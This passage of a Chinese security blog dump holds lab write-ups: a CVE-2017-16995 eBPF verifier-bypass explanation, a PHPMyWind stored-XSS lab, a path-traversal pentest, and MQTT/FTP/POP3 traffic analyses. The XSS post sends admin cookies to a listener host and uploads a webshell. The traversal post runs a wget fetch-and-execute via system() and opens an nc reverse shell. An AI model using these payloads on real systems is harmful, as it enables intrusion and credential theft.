在第3个函数中，会对每一条bpf指令进行验证,我们可以分析该函数。发现该函数会使用类似分支预测的特性。对不会执行的分支根本不会去验证（重点：我们可以让我们的恶意代码位于“不会”跳过去的分支中） 其中对条件转移指令的解析位于: 11.kernel/bpf/verifier.c: check_cond_jmp_op 分析该函数可以发现： 12345678910111213141516171819202122232425262728293031323334353637if (BPF_SRC(insn-\\&gt;code) == BPF_K &amp;&amp;(opcode == BPF_JEQ \\|\\| opcode == BPF_JNE) &amp;&amp;regs[insn-\\&gt;dst_reg].type == CONST_IMM &amp;&amp;regs[insn-\\&gt;dst_reg].imm == insn-\\&gt;imm) &#123;if (opcode == BPF_JEQ) &#123;/\\* if (imm == imm) goto pc+off;\\* only follow the goto, ignorefall-through\\*/\\*insn_idx += insn-\\&gt;off;return 0;&#125; else &#123;/\\* if (imm != imm) goto pc+off;\\* only follow fall-through branch,since\\* that&#x27;s where the program will go\\*/ return 0;&#125;&#125; 寄存器与立即数进行 “不等于”条件判断时，进行了静态分析工作，分析到底执不验证该分支（需结合kernel/bpf/verifier.c:do_check）。而在进行立即数与寄存器比较时,寄存器的类型为： 123456789101112131415struct reg_state &#123; enum bpf_reg_type type;union &#123;/\\* valid when type == CONST_IMM \\| PTR_TO_STACK \\*/ int imm;/\\* valid when type == CONST_PTR_TO_MAP \\| PTR_TO_MAP_VALUE \\|\\* PTR_TO_MAP_VALUE_OR_NULL\\*/ struct bpf_map \\*map_ptr;&#125;;&#125;; 立即数的类型为： 12345678910111213struct bpf_insn &#123;\\__u8 code; /\\* opcode \\*/\\__u8 dst_reg:4; /\\* dest register \\*/\\__u8 src_reg:4; /\\* source register \\*/\\__s16 off; /\\* signed offset \\*/\\__s32 imm; /\\* signed imUbuntu本地提权（CVE-2017-16995）te constant \\*/&#125;; 都为有符号且宽度一致，该比较不会造成问题。 现在转移到bpf虚拟机执行bpf指令的函数: 1/kernel/bpf/core.c: \\__bpf_prog_run 分析该函数，发现 1u64 regs[MAX_BPF_REG]; 其中用 uint64_t 表示寄存器,而立即数继续为struct bpf_insn 中的imm字段. 查看其解析“不等于比较指令”的代码 123456789101112131415\\#define DST regs[insn-\\&gt;dst_reg] \\#define IMM insn-\\&gt;imm........JMP_JEQ_K:if (DST == IMM) &#123;insn += insn-\\&gt;off;CONT_JMP;&#125;CONT; 进行了32位有符号与64位无符号的比较。 那么我们可以这样绕过恶意代码检查: 1234567(u32)r9= (u32)-1 if r9 != 0xffff\\`ffff goto bad_codero,0 exitbad_code:......... 在提交代码进行验证时，对 jne 分析，发现不跳，会略过bad_code的检查。 但是真正运行时，会导致跳转为真，执行我们的恶意代码。 从参考资料3中，下载exp。我们可以在用户向内核提交bpf代码前,将 union bpf_attr结构中的 log_level 字段 设置为1，log其他字段合理填写。在调用提交代码之后，输出log。我们就可以发现我们的那些指令经过了验证。验证结果如下: 可以发现只验证了4 条，但是该exp 有30多条指令(提权)…… 我们查看造成漏洞的代码（64位无符号与32位有符号的比较操作）, 发现其成功跳过了退出指令，执行到了bad_code。 参考链接https://github.com/torvalds/linux/commit/95a762e2c8c942780948091f8f2a4f32fce1ac6f https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html http://cyseclabs.com/exploits/upstream44.c https://sysprogs.com/VisualKernel/tutorials/setup/ubuntu/ https://github.com/mrmacete/r2scripts/blob/master/bpf/README.md https://bugs.chromium.org/p/project-zero/issues/detail?id=1454&amp;desc=3 https://github.com/iovisor/bpf-docs/blob/master/eBPF.md https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c https://www.ichunqiu.com/experiment/detail?id=61491&amp;source=1 https://www.zhihu.com/search?type=content&amp;q=cve-2017-16995 时间线2017-12-21 漏洞相关信息公开 2018-03-16 提权攻击代码被公开 2018-03-16 360CERT对外发布预警通告 2018-03-21 360CERT对外发布技术报告","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://ciaofox.me/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"原理分析","slug":"原理分析","permalink":"http://ciaofox.me/tags/%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"name":"提权漏洞","slug":"提权漏洞","permalink":"http://ciaofox.me/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"600 Privilege Escalation 权限提升","slug":"600-Privilege-Escalation-权限提升","permalink":"http://ciaofox.me/categories/600-Privilege-Escalation-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}]},{"title":"PHPMyWind存储XSS漏洞（CVE-2017-12984）","date":"2019-09-22T03:05:32.000Z","path":"2019/09/22/400 Execution 攻击/PHPMyWind存储XSS漏洞（CVE-2017-12984）/","text":"前言本文依托I春秋实验复现而成，链接：https://www.ichunqiu.com/course/60909，使用了PHPMyWind存储XSS漏洞（CVE-2017-12984）。 实验目的了解PHPMyWind漏洞的危害 学习漏洞代码的分析 掌握PHPMyWind漏洞的验证 实验环境操作机：Windows XP IP：172.16.11.2 目标网址：http://www.test.ichunqiu:8080/ 工具下载地址：file.ichunqiu.com/ak4798ka/ 实验工具Firebug:FireFox浏览器下的插件，集HTML查看和编辑、Javascript控制台、网络状况监视器于一体，是开发JavaScript、CSS、HTML和Ajax的得力助手，本实验使用其修改Cookie功能 Burp suite: Burp Suite 是用于测试web应用程序的集成平台,本实验主要使用其抓包、改包、发包功能 实验步骤步骤1:漏洞验证首先我们来看一下源码，处理客户留言内容的关键代码在message.php文件的第29行和34行 123456\\$content = htmlspecialchars(\\$content); \\$sql = \\&amp;quot;INSERT INTO \\`\\#\\@__message\\` (siteid, nickname, contact,content, orderid, posttime, htop, rtop, checkinfo, ip) VALUES (1, &#x27;\\$nickname&#x27;,&#x27;\\$contact&#x27;, &#x27;\\$content&#x27;, &#x27;\\$orderid&#x27;, &#x27;\\$posttime&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;false&#x27;,&#x27;\\$ip&#x27;)\\&amp;quot;; 我们先看content参数，程序会使用htmlspecialchars() 函数把预定义的字符 “&amp;lt;”（小于）和 “&amp;gt;” （大于）转换为 HTML实体，进行过滤，然后存储至数据库中，这里并没有问题。 然后，我们再看看管理员修改留言的处理方式，代码在admin/message_update.php文件的第26行 123\\&amp;lt;td&amp;gt;&amp;lt;input type=\\&amp;quot;text&amp;quot; name=\\&amp;quot;content&amp;quot;id=\\&amp;quot;content&amp;quot; class=\\&amp;quot;input&amp;quot; value=\\&amp;quot;&amp;lt;?php echo\\$row[&#x27;content&#x27;] ?\\&amp;gt;&amp;quot; /\\&amp;gt;&amp;lt;/td&amp;gt; 管理员编辑留言，编辑器直接读取content内容并显示，却并未进行转义操作，所以导致存储型XSS漏洞的出现。 上面已经分析了漏洞的成因，接下来，我们开始验证这个漏洞。 首先，访问file.ichunqiu.com/ak4798ka/下载实验文件，方便后续操作 然后，使用桌面的Firefox浏览器打开http://www.test.ichunqiu:8080/ ，访问网站首页。 对其进行添加留言操作（留言部分内部是简单的XSS语句） 1\\&amp;lt;img src=x onerror = alert(666); \\&amp;gt; 留言成功。 下一步我们从另一个浏览器登录进入后台页面。 登录成功。 接下来我们尝试查看漏洞。 查看成功，触发XSS。 步骤2:利用XSS获取cookie首先我们利用第三条语句 123\\&amp;lt;img src=x onerror =document.body.appendChild(document.createElement(&#x27;img&#x27;)).setAttribute(&#x27;src&#x27;,&#x27;http://172.16.11.2:8888/?=&#x27;+document.cookie);\\&amp;gt; 这条语句的作用主要在于将cookies回弹回来。 上传过程不再赘述。 打开nc.exe 通过目标端口监听。当对方管理员触发该XSS时，cookie将回弹回来。 监听成功，将cookie存下。 回到攻击者的浏览器，我们将cookie导入。 刷新之后可以直接进入管理员网页。 步骤3:扩大战果当进入后台页面之后，我们需要扩大战果，可以考虑利用菜刀连接进入。 检查上传设置。一般来说网页都会禁止上传php文件，但是我们可以利用图片上传绕过。 将bmp格式改为php 文件。（php后面有个空格）这样上传图片之后会对其进行重命名并且加入后缀。 编写一个带有一句话木马的文件并且更名为png格式。 开始准备上传。 这里我们利用burpsuite代理模式，监视每一个包。 对上传包进行修改，后缀改为.php 格式（php后面有个空格）。 上传成功后开启菜刀。 菜刀远程连接进网站。 连接成功。 参考链接https://www.exploit-db.com/exploits/42535/ http://www.freebuf.com/sectool/159689.html","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://ciaofox.me/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"XSS","slug":"XSS","permalink":"http://ciaofox.me/tags/XSS/"}],"categories":[{"name":"400 Execution 攻击","slug":"400-Execution-攻击","permalink":"http://ciaofox.me/categories/400-Execution-%E6%94%BB%E5%87%BB/"}]},{"title":"协议分析之MQTT协议","date":"2018-12-25T10:25:27.000Z","path":"2018/12/25/协议分析/协议分析之MQTT协议/","text":"本文使用Apollo和Mosquitto搭建了一个简单的信息订阅推送服务器，对MQTT协议的机制和流量进行了初步的分析 实验目的本实验旨在搭建MQTT服务器，并探究MQTT的机制与流量特征。 实验内容实验工具Apollo:Apache Apollo是一个代理服务器，其是在ActiveMQ基础上发展而来的，可以支持STOMP, AMQP, MQTT, Openwire, SSL, and WebSockets 等多种协议。 Mosquitto:Mosquitto是一款实现了消息推送协议 MQTT v3.1 的开源消息代理软件，提供轻量级的，支持可发布/可订阅的的消息推送模式，使设备对设备之间的短消息通信变得简单，比如现在应用广泛的低功耗传感器，手机、嵌入式计算机、微型控制器等移动设备。 MQTT协议详解MQTT（Message Queuing Telemetry Transport，消息队列遥测传输协议），是一种基于发布/订阅（publish/subscribe）模式的”轻量级”通讯协议，该协议构建于TCP/IP协议上，由IBM在1999年发布。MQTT最大优点在于，可以以极少的代码和有限的带宽，为连接远程设备提供实时可靠的消息服务。作为一种低开销、低带宽占用的即时通讯协议，使其在物联网、小型设备、移动应用等方面有较广泛的应用。 MQTT是一个基于客户端-服务器的消息发布/订阅传输协议。MQTT协议是轻量、简单、开放和易于实现的，这些特点使它适用范围非常广泛。在很多情况下，包括受限的环境中，如：机器与机器（M2M）通信和物联网（IoT）。其在，通过卫星链路通信传感器、偶尔拨号的医疗设备、智能家居、及一些小型化设备中已广泛使用。 实验步骤第1步 JDK的环境变量配置新建classpath，值填入 1.;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar; 新建javahome，值为jdk根目录 path处添加jdk的bin目录Path处添加jdk中的jre的bin目录 第2步 Apollo的Windows搭建http://activemq.apache.org/apollo/download.html 下载阿波罗服务器并解压 CMD进入解压的bin目录输入命令apollo create team6创建自己的MQTT服务器 在创建的服务器目录找到ect目录然后配置apollo.xml 修改配置文件，使其可以允许所有IP访问（修改为0.0.0.0） 进入创建的服务器的bin目录下，启动服务器命令： 1apollo-broker.cmd run 默认账号:admin 默认密码:password登陆 Queues:排队等候Topics:话题Durable Subs:持久化的子主题 Mosquitto的搭建Mosquitto是一款实现了消息推送协议 MQTT v3.1 的开源消息代理软件提供轻量级的，支持可发布/可订阅的的消息推送模式，使设备对设备之间的短消息通信变得简单，比如现在应用广泛的低功耗传感器，手机、嵌入式计算机、微型控制器等移动设备。 典型的应用案例: Andy Stanford-ClarkMosquitto（MQTT协议创始人之一）在家中实现的远程监控和自动化。 需要的软件安装: 123sudo apt-get install cmakesudo apt-get install opensslsudo apt-get install libssl-dev 新建目录 build: 1mkdir build 进入 build: 1cd build 编译（提示cmake未安装请安装cmake // apt-get install cmake） 1cmake 解压： 1tar -zxvf mosquitto-1.5.4.tar.gz 更改config.mk 让其支持 websockets（允许服务器向客户端发送消息）： 12WITH_WEBSOCKETS:=no 改为为 WITH_WEBSOCKETS:=yesgedit config.mk 编译前工作准备（必须安装，报错源头）： 12sudo apt-get install libc-ares-dev libc-ares2sudo apt-get install uuid-dev 编译 安装： 1make install Mosquitto启动相关选项：-c，–config文件 从文件加载配置。 如果没有给出，则使用mosquitto.conf（5）中描述的默认值 -d，–daemon 在后台运行蚊子作为守护进程。 所有其他行为保持不变。-p，–port 在指定的端口上监听，而不是默认的1883.除了配置文件中的端口设置外，还会起作用。 可以指定多次以打开在不同端口上侦听的多个套接字。 该套接字将绑定到所有网络接口。-v，–verbose 使用详细日志记录。 这相当于在配置文件中将log_type设置为全部。 这种覆盖和记录选项在配置文件中给出。 运行成功 抓包分析打开客户端。 请求连接时候的数据包分析 确认连接时候的数据包分析 发布信息 订阅请求 确认订阅 取消订阅 确认取消 退出连接","tags":[{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"}],"categories":[{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/categories/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"}]},{"title":"协议分析之FTP协议","date":"2018-12-11T05:07:08.000Z","path":"2018/12/11/协议分析/协议分析之FTP协议/","text":"一、实验原理：FTP（File Transfer Protocol，文件传输协议） 是 TCP/IP协议组中的协议之一。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端。其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。在开发网站的时候，通常利用FTP协议把网页或程序传到Web服务器上。此外，由于FTP传输效率非常高，在网络上传输大的文件时，一般也采用该协议。 默认情况下FTP协议使用TCP端口中的20和21这两个端口，其中20用于传输数据，21用于传输控制信息。但是，是否使用20作为传输数据的端口与FTP使用的传输模式有关，如果采用主动模式，那么数据传输端口就是20；如果采用被动模式，则具体最终使用哪个端口要服务器端和客户端协商决定。 二、实验目的：探究FTP协议两种不同模式的流量特征，了解两种方式的工作原理。 三、实验内容：搭建首先，我们需要在自己的电脑上搭建FTP服务器，然后才能对其进行流量分析。 环境：win10 从这里启动window功能，打开FTP服务。 打开服务之后，在IIS服务器中进行设置。 对你想要保存的FTP站点进行设置，主要是名称和物理路径。然后设置IP地址和端口。 身份验证和权限我们为了方便访问直接全选。同时不给它设置SSL证书以方便抓取流量。 往物理地址中丢入一点东西。方便访问。 接下来我们尝试登陆。 看起来我们已经搭建成功了。那么我们进入到下一步，对其流量进行分析。 流量分析 直接win+r中输入ftp打开ftp服务，接下来使用指令登陆ftp服务器。 输入用户和密码登陆服务器（如果设置了匿名也可以直接登陆）。返回230。 这是ftp协议的应答表，可以对应查看。 但是这时候我们查看wireshark的流量包，找不到对应的ftp流量。这是为什么呢？我本来以为因为ftp流量包含在tcp/ip协议中，所以着重去查看tcp协议，但是资料上说ftp协议全是明文，不应该这么难找。于是继续查阅资料。 找到原因了。因为ftp访问本地根本不会通过网关。而wireshark抓取的是通过网关的流量，所以用wireshark抓取不到本地ftp服务器的流量。那我们可以尝试抓取别人的ftp流量或者在虚拟机中使用ftp服务器。在这里为了省事我们直接使用别人的ftp服务器。 这是登陆之后的界面。我们查看wireshark抓取到的流量包。/ 可以看到，经过tcp的三次握手之后，ftp包显示220，查阅对照表，这意味着服务器已经就绪。 刷新页面之后，可以看出我们所有的流量都是明文可见，在这里我们归纳出ftp协议的第一个特征：所有流量明文可见，包括用户和密码。 Pwd指令的意思是直接显示当下目录所有的文件 CWD意味着访问一个文件，下面返回的250表示文件行为已完成。在这里我们归纳出ftp协议的第二个特点：每个操作都会返回应答码。 直接追踪流会看得轻松一些。接下来我们尝试下载某个文件。 PORT模式，是客户端通过PORT命令告诉服务器端要使用的数据端口号，然后在客户端主动建立起这个端口的TCP/IP监听。在进行文件传输的操作时，服务器来连接客户端的这个数据端口，进行数据传输。 PASV模式，是客户端通过PASV命令来告诉服务器端，想使用PASV方式传输数据。服务器收到命令之后，主动在服务器端建立一个数据端口的TCP/IP监听，并把这个数据端口号返回客户端。在进行文件传输的操作时，客户端去连接服务器端的这个数据端口，进行数据传输。 表明了，这个客户机向服务器发送了监听，告诉服务器想使用pasv 的方式进行连接 服务器回答为进入主动的连接模式，表示要服务器主动跟客户机连接 接下来成功地接受了文件后退出 四、结果分析：本次实验中我们归纳出了ftp协议的两个特征： 所有流量明文传输，包括账号和密码。 每次操作都会返回对应的应答码，需要查阅对照表才能明白。","tags":[{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"}],"categories":[{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/categories/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"}]},{"title":"协议分析之POP3协议与SMTP协议","date":"2018-11-27T05:03:32.000Z","path":"2018/11/27/协议分析/协议分析之POP3协议/","text":"本报告搭建了POP3服务器和SMTP服务器，对其进行了简单的流量分析，并且简单总结了其异同。 一、实验原理：#POP3协议，全名为“Post Office Protocol - Version3”，即“邮局协议版本3”。是TCP/IP协议族中的一员，由RFC1939定义。本协议主要用于支持使用客户端远程管理在服务器上的电子邮件。提供了SSL加密的POP3协议被称为POP3S。 POP协议，支持“离线”邮件处理。其具体过程是：邮件发送到服务器上，电子邮件客户端调用邮件客户机程序以连接服务器，并下载所有未阅读的电子邮件。这种离线访问模式是一种存储转发服务，将邮件从邮件服务器端送到个人终端机器上，一般是PC机或MAC。一旦邮件发送到 PC机或MAC上，邮件服务器上的邮件将会被删除。但目前的POP3邮件服务器大都可以“只下载邮件，服务器端并不删除”，也就是改进的POP3协议。 SMTP协议，是一种提供可靠且有效的电子邮件传输的协议。SMTP是建立在FTP文件传输服务上的一种邮件服务，主要用于系统之间的邮件信息传递，并提供有关来信的通知。SMTP独立于特定的传输子系统，且只需要可靠有序的数据流信道支持，SMTP的重要特性之一是其能跨越网络传输邮件，即“SMTP邮件中继”。使用SMTP，可实现相同网络处理进程之间的邮件传输，也可通过中继器或网关实现某处理进程与其他网络之间的邮件传输。 二、实验目的：#利用开源软件ewomail搭建自己的邮件服务器并且对其流量进行分析。 三、实验内容：#1、选择环境在这里我使用了开源软件EwoMail邮件服务器软件进行邮件服务器搭建。EwoMail是基于Linux的开源邮件服务器软件，集成了众多优秀稳定的组件，是一个快速部署、简单高效、多语言、安全稳定的邮件解决方案，帮助你提升运维效率，降低IT 成本，兼容主流的邮件客户端，同时支持电脑和手机邮件客户端。 我认为这个软件很适合用来搭建邮件服务器，原因有以下三点： 该软件完全开源，所有代码都可见。而且作为一个成熟的项目，该软件可以方便地找到资料。 集成组件Postfix:邮件服务器Dovecot:IMAP/POP3/邮件存储Amavisd:反垃圾和反病毒。符合了我们的要求。（主要探究POP3协议） 部署简单，只需要一台centos的服务器就可以搭建。 https://github.com/gyxuehu/EwoMail 2、安装虚拟机 这里有一个坑一定要记得，centos安装时候默认不开启网络的，需要手动打开。如果错过了这一步，那只有等安装好之后用命令好修改打开，十分麻烦（我在这一步上一直出错）。 在这里贴上如果忘记打开网络，命令行的做法。 1.打开网络配置文件 1vi /etc/sysconfig/network-scripts/ifcfg-eth0 2.在文件末尾追加DNS 123DNS1=8.8.8.8DNS2=4.2.2.2 3.重启网络 ifup eth0 这里要注意一点，centos默认是不带图形界面的，只有命令行界面，虽然说我们依然可以利用命令行界面搭建，但是这样不方便而且也很难以操作。所以我们选择下载图形界面。 这里需要注意的是，centos在命令行下好像没法粘贴复制，所以需要手打。 注意空格。 1yum groupinstall &quot;GNOME Desktop&quot; &quot;Graphical Administration Tools&quot; 完成之后我们用另一个指令打开图形界面。 123ln -sf /lib/systemd/system/runlevel5.target /etc/systemd/system/default.target startx 成功。 安装ewomail 参考文档：http://doc.ewomail.com/docs/ewomail/jianjie 关闭selinux1vi /etc/sysconfig/selinux SELINUX=enforcing 改为 SELINUX=disabled 检查swap如果没启动swap，这会导致EwoMail的防病毒组件不能启动，所以在安装前先检查swap是否已经启动，如已启动可跳过该步骤。 查看swap 1free -m 邮箱域名EwoMail本身是可以配置多个域名来收发邮件的，但在安装前需要一个邮箱的主域名。本次教程例子使用的主域名是ciaofox.cn 查看当前主机名 1hostname -f 安装安装前请服务器必须已链接网络，安装时间将会根据你的系统配置和网络环境大概会在10分钟内安装完成。（需要root权限） 打开：http://www.ewomail.com/list-11.html 输入你的域名获取安装代码 这里要记得用sudo指令，或者切换进入root账户下。否则会出现问题。 这种问题。 对POP3流量进行分析 使用telnet直接进入163邮箱服务器。输入o（连接主机），然后通过110端口连接进163邮箱服务器。 可以看到POP协议的内容，和我们得到的东西很接近。那么我们再查看流量包，尤其是TCP协议。 从这里我们可以看出TCP的三次握手，对110端口。连接建立之后返回了一个POP报文，内容是 1+OK Welcome to coremail Mail Pop3 Server(163coms[b62aaa251425b4be4eaec4ab4744cf47s]) 接下来我们尝试登陆163邮箱（账号来自于别人），得到了明文的报文。 跟踪流可知每次输入都会进行ACK上传，密码是通过明文传输的。（好像不太安全） 输入quit退出，可以看到ACK报文，确认之后经过四次挥手结束流程。 总结：可以看出POP3协议在登陆时会先进行身份验证，即账号和密码。验证之后可以通过发送对应指令获得所有未读信息到主机，完成登陆与邮件的获取。从抓到的包中可以看出几点，1，它是通过一个字符一个字符地上传。2，密码与账号都是通过明文上传。 SMTP协议分析 一样的方法，可以看出是先经过TCP3次握手再传送回SMTP报文。 1220 163.com Anti-spam GT for Coremail System (163com[20141201]) helo 和ehlo指令的作用是向服务器标示用户身份，返回邮件服务器身份。 输入auth login验证用户（验证用户使用authlogin进行验证时用户名和密码是经过base64编码过后的字符） 502是telnet没有设置到SMTP服务。设置之后就好了。 账号经过base64编码后为bGVlYW5ua2FAMTYzLmNvbQ。但是同样是明文传递。 客户端向服务器发送用户登录命令“AUTH LOGIN”，服务器回复表示接受（“334”表示接受） 客户端分别向服务器发送编码后的用户名和密码， 服务器分别回复“ 334”“235”表示接受。 总结：SMTP和POP3的特点之一在于POP3无法发送邮件，更多是接受，而SMTP可以接受与发送。另一个特点在于POP3完全是明文发送，而SMTP会经过base64转码。","tags":[{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"}],"categories":[{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/categories/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"}]},{"title":"渗透记录之路径遍历","date":"2018-10-31T07:27:18.000Z","path":"2018/10/31/400 Execution 攻击/渗透记录之路径遍历/","text":"写在前言之前本文章写于我刚转专业一段时间，在渗透课上使用靶机作为模拟环境学习技术。以现在的目光来看这篇报告水平实在短浅。这是我第一次使用到shell（其实那时候还并不知道什么是webshell），当时觉得这真是一门神奇的技术，未曾想过之后有一天我会用得这么熟练。这篇报告仅是作为记录，留在blog中。 前言 路径遍历攻击（也称为目录遍历）旨在访问存储在Web根文件夹之外的文件和目录。通过操纵带有“点-斜线（..）”序列及其变化的文件或使用绝对文件路径来引用文件的变量，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码、配置和关键系统文件。 需要注意的是，系统操作访问控制（如在微软Windows操作系统上锁定或使用文件）限制了对文件的访问权限。 这种攻击也称为“点-点斜线”、“目录遍历”、“目录爬升”和“回溯”。 攻击机： kali linux 192.168.88.181 靶场机器：linux 192.168.88.107 扫描 扫描的目的是查看能用的服务，重点查找http服务。使用nikto -hosthttp://靶场IP地址:端口和 dirbhttp://靶场IP:端口 进行http探测。 分析 下一步让我们进入该http对应的网页，查看是否存在某些东西。 看起来是个购物网站，接下来我们查看dirb扫描出的东西，查询是否有利用价值的东西。 打开该链接，查看到一个php文件，打开尝试一下。 是一个类似数据库管理界面。接下来我们考虑使用工具。 -- owasp-zap web漏洞扫描器，自动挖掘web应用程序中的漏洞； 该工具会爬取挖取当前页面的漏洞并且自行保存。从图中可以看出他会发送大量数据包。 挖取结束之后可以查看漏洞，红色代表高危漏洞，黄色代表普通漏洞。浅黄色可能无法利用。 该漏洞代表当我们访问该url时候就会弹出etcpassword信息。那让我们尝试一下，进入该url。 接下来让我们分析获得的信息。 利用目录遍历漏洞获取shell思路： --上传webshell到服务器，之后通过对应的目录遍历路径访问webshell，执行webshell。在kalilinux当中获取反弹shell; 同时我们尝试进入数据库后台，尝试弱口令进入。 登陆之后开始查找可以使用webshell的点。 然后开始修改webshell，使其可用。 创建shell.php，字段（写入&lt;?php system(“cd /tmp;wgethttp://ip:port/webshell.php;chmod +x webshell.php;php webshell”);?&gt;） 监听 下一步使用python -m “simpleHTTPServer”监听回弹。 启动监听 nc -- nc –nlvp 端口号 启动终端 -- python –c “import pty;pty.spawn(‘/bin/bash’)” （因为这里一直在失败所以直接使用了教程的图） 接下来我们需要完成的，是对其的提权，那是下节课的任务。","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://ciaofox.me/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"路径遍历","slug":"路径遍历","permalink":"http://ciaofox.me/tags/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/"}],"categories":[{"name":"400 Execution 攻击","slug":"400-Execution-攻击","permalink":"http://ciaofox.me/categories/400-Execution-%E6%94%BB%E5%87%BB/"}]},{"title":"模板","date":"2018-10-25T10:25:27.000Z","path":"2018/10/25/LeetCode/模板/","text":"","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"协议分析之流量抓取","date":"2018-10-25T10:25:27.000Z","path":"2018/10/25/协议分析/协议分析之流量抓取/","text":"本报告主要是存档关于QT编写的流量包抓取代码。 实验工具Burpsuite：BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。 Wireshark：（前称Ethereal）是一个网络封包分析软件。网络封包分析软件的功能是撷取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。在过去，网络封包分析软件是非常昂贵的，或是专门属于盈利用的软件。Ethereal的出现改变了这一切。在GNUGPL通用许可证的保障范围底下，使用者可以以免费的代价取得软件与其源代码，并拥有针对其源代码修改及客制化的权利。Ethereal是全世界最广泛的网络封包分析软件之一。 实验目的1.对web服务器访问并抓取流量 2.图片解释BurpSuite和wireshark区别 3.在QT中编写抓取http包程序 实验环境 操作机：Kali Linux IP：118.112.95.*** 目标IP：60.190.63.14 实验步骤抓包测试因为手里刚好有最近扫出来的一个IP，可以用来配合做实验，就不再使用虚拟机搭建服务器，直接用现成IP实验抓包。 打开wireshark，抓取该IP的数据包。获得很多。可以看出，三次握手之后本机IP向目标IP发送了get请求，然后目的IP发送了数据包（包含网页信息）给本机IP。浏览器再将其打开。 我们可以由此看到可以看到抓取到的包和网页元素相对应。 Burpsuite和Wireshark的区别 编写HTTP抓取程序 代码太长，点击展开 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351# include &lt;sys/socket.h&gt;# include &lt;netinet/in.h&gt;# include &lt;arpa/inet.h&gt;# include &quot;nids.h&quot;char ascii_string[10000];char *char_to_ascii(char ch)/*此函数功能主要用于把协议数据进行显示*/&#123; char *string; ascii_string[0] = 0; string = ascii_string; /*打印字符*/ if(isgraph(ch)) &#123; *string++ = ch; &#125; /*打印空格*/ else if (ch == &#x27;.&#x27;) &#123; *string++ == ch; &#125; /*打印回车和换行*/ else if (ch == &#x27;\\n&#x27; || ch == &#x27;\\r&#x27;) &#123; *string++ = ch; &#125; /*打印其他字符，以.显示*/ else &#123; *string++ = &#x27;.&#x27;; &#125; *string = 0; return ascii_string;&#125;void parse_client_data(char content[], int number)&#123; char temp[1024]; char str1[1024];//http协议 char str2[1024];//状态码显示 char str3[1024];//未知代码 unsigned int i; unsigned int k=0; unsigned int j; char entity_content[1024]; if(content[0] != &#x27;H&#x27; &amp;&amp; content[1] != &#x27;T&#x27; &amp;&amp; content[2] != &#x27;T&#x27; &amp;&amp; content[3] != &#x27;P&#x27;) &#123; printf(&quot;实体内容为（续）: \\n&quot;); for (i = 0; i &lt; number; i++) &#123; printf(&quot;%s&quot;, char_to_ascii(content[i])); &#125; printf(&quot;\\n&quot;); &#125; else &#123; printf(&quot;number:%d\\n&quot;,number); for (i = 0; i &lt; strlen(content); i++) &#123; if (content[i] != &#x27;\\n&#x27;) &#123; k++; continue; &#125; for (j = 0; j &lt; k; j++) &#123; temp[j] = content[j + i - k]; &#125; temp[j] = &#x27;\\0&#x27;; if (strstr(temp, &quot;HTTP&quot;)) &#123; printf(&quot;状态行为: &quot;); printf(&quot;%s\\n&quot;,temp); sscanf(temp, &quot;%s %s %s&quot;, str1, str2,str3); printf(&quot;HTTP协议为: %s\\n&quot;, str1); printf(&quot;状态代码为: %s\\n&quot;, str2); printf(&quot;未知代码：%s\\n&quot;,str3); &#125; if (strstr(temp, &quot;Date&quot;)) &#123; printf(&quot;当前的时间为(Date) : %s\\n&quot;, temp + strlen(&quot;Date:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Server&quot;)) &#123; printf(&quot;服务器为 （ Server ）: %s\\n&quot;, temp + strlen(&quot;Server:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, 